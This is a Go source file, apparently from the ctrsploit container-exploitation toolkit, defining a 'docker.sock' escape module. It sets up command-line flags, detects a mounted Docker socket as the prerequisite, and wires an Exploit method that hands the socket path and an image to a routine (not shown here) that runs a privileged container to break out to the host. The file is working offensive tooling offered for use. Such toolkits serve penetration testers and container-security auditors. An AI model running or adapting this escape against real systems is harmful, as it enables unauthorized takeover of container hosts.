package docker_sock

import (
	"context"
	"fmt"
	"os"

	"github.com/ctrsploit/ctrsploit/prerequisite/mount/mountinfo/mountpoint"
	"github.com/ctrsploit/ctrsploit/prerequisite/mount/mountinfo/root"
	"github.com/ctrsploit/sploit-spec/pkg/app"
	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
	"github.com/ctrsploit/sploit-spec/pkg/vul"
	"github.com/urfave/cli/v3"
)

var (
	aliases      = []string{"docker"}
	exploitFlags = []cli.Flag{
		&cli.StringFlag{
			Name:    "image",
			Aliases: []string{"i"},
			Usage:   "image to run as a privileged container",
			Value:   "busybox:latest",
		},
		&cli.BoolFlag{
			Name:    "pull",
			Aliases: []string{"p"},
			Usage:   "pull the image before running",
			Value:   false,
		},
		&cli.BoolFlag{
			Name:    "clean",
			Aliases: []string{"c"},
			Usage:   "clean up the container after exit",
			Value:   false,
		},
		&cli.BoolFlag{
			Name:    "tty",
			Aliases: []string{"t"},
			Usage:   "tty mode",
			Value:   true,
		},
		&cli.BoolFlag{
			Name:    "force",
			Aliases: []string{"f"},
			Usage:   "force exploit even if checksec fails",
		},
		&cli.StringFlag{
			Name:    "sock",
			Aliases: []string{"s"},
			Usage:   "path to docker.sock, if not specified, will try to detect automatically",
		},
	}
	CheckSecCmd = app.Vul2ChecksecCmd(&Vul, aliases, nil)
	ExploitCmd  = app.Vul2ExploitCmd(&Vul, aliases, exploitFlags, true)
	VulCmd      = app.Vul2VulCmd(&Vul, aliases, nil, exploitFlags, true)
)

var (
	Vul = vulnerability{
		BaseVulnerability: vul.BaseVulnerability{
			Name:        "docker.sock",
			Description: "escape by shared docker.sock via running a privileged container",
			Level:       vul.LevelHigh,
			ExeEnv: exeenv.ExeEnv{
				Env:     exeenv.InContainer,
				Check:   exeenv.InContainer,
				Exploit: exeenv.InContainer,
			},
			CheckSecPrerequisites: prerequisite.Or(
				&mountpoint.DockerSock,
				&root.DockerSock,
			),
			ExploitablePrerequisites: nil,
		},
	}
)

type vulnerability struct {
	vul.BaseVulnerability
}

type mountPointProvider interface {
	RealMountPoint() string
}

func (v *vulnerability) getSockPath(cmd *cli.Command) (string, error) {
	sock := cmd.String("sock")
	if sock != "" {
		if _, err := os.Stat(sock); err == nil {
			return sock, nil
		} else {
			return "", fmt.Errorf("specified docker.sock path %s does not exist", sock)
		}
	}
	for pre := range v.CheckSecPrerequisites.Range() {
		if satisfied, _ := pre.Check(); satisfied {
			if provider, ok := pre.(mountPointProvider); ok {
				return provider.RealMountPoint(), nil
			} else {
				return "", fmt.Errorf("[UNLIKELY] unknown prerequisite type: %T", pre)
			}
		}
	}
	return "", fmt.Errorf("[UNLIKELY] no prerequisites satisfied")
}

func (v *vulnerability) Exploit(cmd *cli.Command) (err error) {
	if err := v.BaseVulnerability.Exploit(cmd); err != nil {
		return err
	}
	sock, err := v.getSockPath(cmd)
	if err != nil {
		return err
	}
	image := cmd.String("image")
	pull := cmd.Bool("pull")
	tty := cmd.Bool("tty")
	clean := cmd.Bool("clean")
	ctx := context.Background()
	return Exploit(ctx, sock, image, pull, tty, clean, os.Stdin, os.Stdout, os.Stderr)
}
